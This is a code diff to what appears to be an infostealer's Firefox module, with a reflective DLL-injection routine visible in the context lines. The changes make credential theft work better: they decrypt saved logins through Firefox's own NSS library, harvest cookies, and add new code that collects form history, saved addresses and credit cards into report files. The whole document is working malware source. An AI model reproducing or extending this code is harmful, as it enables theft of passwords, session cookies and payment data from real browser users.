@@ -391,7 +391,7 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
 
 // Firefox NSS function pointers
 typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
-typedef struct { unsigned int len; unsigned char* data; } SECItem;
+typedef struct { unsigned char* data; unsigned int len; int type; } SECItem;
 typedef SECStatus(*NSSInit_t)(const char*);
 typedef SECStatus(*NSSShutdown_t)(void);
 typedef SECStatus(*PK11SDRDecrypt_t)(SECItem*, SECItem*, void*);
@@ -412,17 +412,15 @@ void collect_firefox(const BrowserConfig& browser) {
         while (std::getline(file, line)) {
             if (line.find("Path=") == 0) {
                 std::string p = line.substr(5);
-                bool is_relative = true;
-                // Simplified relative check
-                fs::path profile_path = is_relative ? (data_path / p) : fs::path(p);
+                fs::path profile_path = data_path / p;
                 if (fs::exists(profile_path)) profile_paths.push_back(profile_path);
             }
         }
     }
 
-    if (profile_paths.empty()) {
+    if (profile_paths.empty() && fs::exists(data_path)) {
         for (const auto& entry : fs::directory_iterator(data_path)) {
-            if (entry.is_directory() && fs::exists(entry.path() / "logins.json")) profile_paths.push_back(entry.path());
+            if (entry.is_directory() && (fs::exists(entry.path() / "logins.json") || fs::exists(entry.path() / "key4.db"))) profile_paths.push_back(entry.path());
         }
     }
 
@@ -436,7 +434,10 @@ void collect_firefox(const BrowserConfig& browser) {
     NSSShutdown_t f_NSS_Shutdown = nullptr;
     PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
 
-    SetDllDirectoryW(bin_dir.c_str());
+    wchar_t original_cwd[MAX_PATH];
+    GetCurrentDirectoryW(MAX_PATH, original_cwd);
+    SetCurrentDirectoryW(bin_dir.c_str());
+
     h_nss = LoadLibraryW(L"nss3.dll");
     if (h_nss) {
         f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init");
@@ -457,38 +458,41 @@ void collect_firefox(const BrowserConfig& browser) {
 
         // Decrypt Logins
         if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
-            if (f_NSS_Init(p_path.string().c_str()) == SECSuccess) {
-                fs::path login_file = p_path / "logins.json";
-                if (fs::exists(login_file)) {
-                    std::ifstream lf(login_file);
-                    json lj = json::parse(lf, nullptr, false);
-                    if (!lj.is_discarded() && lj.contains("logins")) {
-                        for (auto& login : lj["logins"]) {
-                            std::string enc_u = login["encryptedUsername"];
-                            std::string enc_p = login["encryptedPassword"];
-                            std::string url = login["hostname"];
+            std::string nss_path = "sql:" + p_path.string();
+            if (f_NSS_Init(nss_path.c_str()) != SECSuccess) {
+                f_NSS_Init(p_path.string().c_str());
+            }
 
-                            auto dec_user_blob = base64_decode(enc_u);
-                            auto dec_pass_blob = base64_decode(enc_p);
+            fs::path login_file = p_path / "logins.json";
+            if (fs::exists(login_file)) {
+                std::ifstream lf(login_file);
+                json lj = json::parse(lf, nullptr, false);
+                if (!lj.is_discarded() && lj.contains("logins")) {
+                    for (auto& login : lj["logins"]) {
+                        std::string enc_u = login["encryptedUsername"];
+                        std::string enc_p = login["encryptedPassword"];
+                        std::string url = login["hostname"];
 
-                            SECItem in_u = { (unsigned int)dec_user_blob.size(), (unsigned char*)dec_user_blob.data() };
-                            SECItem out_u = { 0, nullptr };
-                            SECItem in_p = { (unsigned int)dec_pass_blob.size(), (unsigned char*)dec_pass_blob.data() };
-                            SECItem out_p = { 0, nullptr };
+                        auto dec_user_blob = base64_decode(enc_u);
+                        auto dec_pass_blob = base64_decode(enc_p);
 
-                            std::string username = enc_u, password = enc_p;
-                            if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess) {
-                                username = std::string((char*)out_u.data, out_u.len);
-                            }
-                            if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess) {
-                                password = std::string((char*)out_p.data, out_p.len);
-                            }
-                            p_data.passwords.push_back({ url, username, password });
+                        SECItem in_u = { (unsigned char*)dec_user_blob.data(), (unsigned int)dec_user_blob.size(), 0 };
+                        SECItem out_u = { nullptr, 0, 0 };
+                        SECItem in_p = { (unsigned char*)dec_pass_blob.data(), (unsigned int)dec_pass_blob.size(), 0 };
+                        SECItem out_p = { nullptr, 0, 0 };
+
+                        std::string username = enc_u, password = enc_p;
+                        if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess) {
+                            username = std::string((char*)out_u.data, out_u.len);
                         }
+                        if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess) {
+                            password = std::string((char*)out_p.data, out_p.len);
+                        }
+                        p_data.passwords.push_back({ url, username, password });
                     }
                 }
-                f_NSS_Shutdown();
             }
+            f_NSS_Shutdown();
         }
 
         // Cookies
@@ -500,12 +504,13 @@ void collect_firefox(const BrowserConfig& browser) {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        long long expiry = sqlite3_column_int64(stmt, 4);
                         p_data.cookies.push_back({
                             (const char*)sqlite3_column_text(stmt, 0),
                             (const char*)sqlite3_column_text(stmt, 1),
                             (const char*)sqlite3_column_text(stmt, 2),
                             (const char*)sqlite3_column_text(stmt, 3),
-                            sqlite3_column_int64(stmt, 4) * 1000000,
+                            (expiry + 11644473600LL) * 1000000,
                             sqlite3_column_int(stmt, 5),
                             sqlite3_column_int(stmt, 6),
                             0
@@ -536,6 +541,49 @@ void collect_firefox(const BrowserConfig& browser) {
                 sqlite3_close(db);
             }
             cleanup_db_temp(tmp_db);
+        }
+
+        // Autofill (Form History)
+        db_path = p_path / "formhistory.sqlite";
+        tmp_db = temp_dir / (profile_name + "_auto.tmp");
+        if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+            sqlite3* db;
+            if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                sqlite3_stmt* stmt;
+                if (sqlite3_prepare_v2(db, "SELECT fieldname, value FROM moz_formhistory", -1, &stmt, nullptr) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
+                        p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            }
+            cleanup_db_temp(tmp_db);
+        }
+
+        // Autofill (Addresses/Cards - autofill-profiles.json)
+        fs::path auto_json = p_path / "autofill-profiles.json";
+        if (fs::exists(auto_json)) {
+            std::ifstream aj_f(auto_json);
+            json aj = json::parse(aj_f, nullptr, false);
+            if (!aj.is_discarded()) {
+                if (aj.contains("addresses")) {
+                    for (auto& item : aj["addresses"]) {
+                        for (auto it = item.begin(); it != item.end(); ++it) {
+                            if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() });
+                        }
+                    }
+                }
+                if (aj.contains("creditCards")) {
+                    for (auto& item : aj["creditCards"]) {
+                        for (auto it = item.begin(); it != item.end(); ++it) {
+                            if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() });
+                        }
+                    }
+                }
+            }
         }
 
         // Save Firefox reports
@@ -596,11 +644,20 @@ void collect_firefox(const BrowserConfig& browser) {
             }
             hist_file.close();
             std::ofstream(profile_dir / "history.json") << pj_hist.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
+
+            std::ofstream auto_file(profile_dir / "autofill.txt");
+            json pj_auto = json::array();
+            for (auto& a : p_data.autofill) {
+                auto_file << "Name: " << a.name << " | Value: " << a.value << "\n";
+                pj_auto.push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}});
+            }
+            auto_file.close();
+            std::ofstream(profile_dir / "autofill.json") << pj_auto.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
         } catch (...) {}
     }
 
     if (h_nss) FreeLibrary(h_nss);
-    SetDllDirectoryW(NULL);
+    SetCurrentDirectoryW(original_cwd);
     fs::remove_all(temp_dir);
 }
 
